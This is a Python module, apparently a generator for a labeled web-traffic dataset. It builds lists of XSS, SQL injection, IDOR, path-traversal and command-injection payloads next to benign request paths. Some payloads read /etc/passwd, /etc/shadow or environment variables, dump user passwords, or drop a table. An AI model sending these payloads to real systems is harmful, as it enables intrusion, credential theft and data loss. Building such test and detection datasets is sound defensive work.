# attacker/payloads.py
# deterministic generator with expanded XSS & SQLi lists, plus LFI and CMDINJ
import itertools
import re

def deterministic_expand(templates, values):
    out = []
    for t in templates:
        keys = re.findall(r"\{(\w+)\}", t)
        if not keys:
            out.append(t)
            continue
        lists = [values.get(k, [""]) for k in keys]
        for combo in itertools.product(*lists):
            s = t
            for k, v in zip(keys, combo):
                s = s.replace("{" + k + "}", str(v))
            out.append(s)
    # preserve order & unique
    return list(dict.fromkeys(out))

# placeholders
VALUES = {
    "num": ["1", "2", "3", "4", "5", "10", "42", "1337", "9999", "' OR '1'='1", "0=0", "sleep(5)"],
    "id": ["1", "2", "3", "4", "10", "42", "101", "1337", "9999"],
    "file": [
        "../../etc/passwd", "/etc/passwd", "/app/config.json",
        "backup.tar.gz", "config.yaml", "/var/www/html/.env",
        "/proc/self/environ", "/etc/shadow"
    ],
    "name": ["alice", "bob", "charlie"]
}

# -------------------
# XSS (exact list provided)
# -------------------
xss = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%3Csvg%2Fonload%3Dalert%281%29%3E",
    "'><img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<a href=\"#\" onclick=\"alert(1)\">x</a>",
    "<div onmouseover=alert(1)>hover</div>",
    "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "<script>/*comment*/alert('x')</script>",
    "<scr\0ipt>alert(1)</scr\0ipt>",
    "<svg><script>alert(1)</script></svg>",
    "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "\" onerror=\"alert(1)\" \"",
    "<img src=x onerror=javascript:alert(1)>",
    "<svg/onload=/*--><script>alert(1)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=1 onerror=alert`1`>",
    "<math><mi><script>alert(1)</script></mi></math>",
    "<script>" + "A"*100 + ";</script>",
    "%3Ciframe%20src%3D%27javascript:alert(1)%27%3E%3C/iframe%3E",
    "<a href=\"javascript:alert(1)\">x</a>",
    "\u003Cscript\u003Ealert(1)\u003C/script\u003E",
    "</title><script>alert(1)</script>",
    "<svg><g><script>alert(1)</script></g></svg>",
    "<input autofocus onfocus=alert(1)>",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "<ScRipT>alert(1)</sCriPt>",
    "<svg/onload=alert(1)><!--",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "\";alert(1);//",
    "<script>/*x*/alert(1)</script>",
    "<img src=x onerror=confirm(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "%3Csvg%2Fonload%3Dalert(1)%3E",
    "<form action=javascript:alert(1)><input type=submit></form>"
]

# -------------------
# SQLi (exact list provided)
# -------------------
sqli = [
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' OR 1=1-- -",
    "1 OR 1=1",
    "' OR ''=''",
    "1' OR '1'='1' #",
    "admin' -- ",
    "%27 OR %271%27=%271%27--",
    "1') OR ('1'='1",
    "1' OR '1'='1'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "UNION+SELECT+NULL--",
    "UNION%20SELECT%20NULL--",
    "' AND 1=(SELECT COUNT(*) FROM users); --",
    "' AND 'a'='a",
    "' OR 'x'='x'",
    "' OR SLEEP(0) --",
    "1 OR SLEEP(0)",
    "1; WAITFOR DELAY '0:0:0'--",
    "0x27||0x27=0x27",
    "1%20OR%201=1",
    "%27%20OR%20%271%27=%271%27--",
    "' OR 1=1#",
    "' OR '1'='1'-- -",
    "1' OR EXISTS(SELECT 1 FROM users)--",
    "' OR (SELECT COUNT(*) FROM users) > 0--",
    "' OR (SELECT TOP 1 name FROM sys.objects)='a'--",
    "'; DROP TABLE IF EXISTS tmp_table; --",
    "1 OR '1'='1' ORDER BY 1--",
    "1 OR '1'='1' GROUP BY 1--",
    "' OR '1'='1' -- -",
    "or 1=1 --",
    "or 'a'='a' --",
    "'" + "A"*50,
    "%27" + "A"*40,
    "' OR '1'='1' /*comment*/",
    "%27%20OR%20%271%27=%271%27%20--%20",
    "1' OR '1'='1'/*",
    "id=1;--",
    "id=1 OR 1=1",
    "1 OR '1'='1'-- -%00",
    "' OR ''='",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "0 or 0=0",
    "1 /*'*/ or 1=1",
    "' OR LENGTH(version())>0 --",
    "1' OR '1'='1' /* long padding */" + "B"*30
]

# -------------------
# IDOR (reduced set)
# -------------------
idor_templates = [
    "/rest/user/{id}",
    "/api/v1/account/{id}",
    "/download?file={file}",
    "/profile/{id}/settings",
    "/orders/{id}/details",
    "/invoices/{id}/download",
    "/users/{id}/avatar",
    "/admin/user/{id}/impersonate"
]
idor = deterministic_expand(idor_templates, VALUES)

# -------------------
# LFI / Path traversal
# -------------------
lfi_templates = [
    "/?file=../../../../etc/passwd",
    "/?file=../../../../etc/passwd%00",
    "/?file=/proc/self/environ",
    "/?file=..%2F..%2F..%2Fetc%2Fpasswd",
    "/download?file=../../../../etc/passwd",
    "/?page=../../../../etc/passwd",
    "/?path=../../../../etc/passwd",
    "/?file=/etc/passwd",
]
lfi = deterministic_expand(lfi_templates, VALUES)

# -------------------
# Command injection / RCE-ish
# -------------------
cmdinj_templates = [
    "/?id=1; id",
    "/?id=1 && cat /etc/passwd",
    "/?cmd=ls -la /",
    "/?q=`whoami`",
    "/?exec=python -c 'import os;os.system(\"id\")'",
    "/?search=1; cat /etc/passwd",
    "/?id=1 | id",
    "/?input=; /bin/ls -la",
]
cmdinj = deterministic_expand(cmdinj_templates, VALUES)

# -------------------
# Normal traffic
# -------------------
normal_templates = [
    "/", "/home", "/about", "/contact", "/login", "/logout",
    "/products", "/products?page={num}", "/search?q=phone",
    "/search?q=phone&sort=asc", "/static/logo.png", "/robots.txt",
    "/api/ping", "/health", "/status", "/docs", "/terms", "/privacy",
    "/blog", "/blog?page={num}", "/category/{num}", "/sitemap.xml",
    "/css/style.css", "/js/app.js"
]
normal = deterministic_expand(normal_templates, VALUES)
for i in range(1, 201):
    normal.append(f"/products?page={i}")
    normal.append(f"/blog?page={i}")
normal = list(dict.fromkeys(normal))[:600]

# -------------------
# Final lists (caps to avoid domination)
# -------------------
def uniq(seq):
    return list(dict.fromkeys(seq))

sqli_final = uniq(sqli)[:2000]
xss_final  = uniq(xss)[:800]
idor_final = uniq(idor)[:200]
lfi_final  = uniq(lfi)[:200]
cmdinj_final = uniq(cmdinj)[:200]
normal_final = uniq(normal)[:600]

PAYLOADS = {
    "sqli": sqli_final,
    "xss": xss_final,
    "idor": idor_final,
    "lfi": lfi_final,
    "cmdinj": cmdinj_final,
    "normal": normal_final
}

if __name__ == "__main__":
    print({k: len(v) for k, v in PAYLOADS.items()})
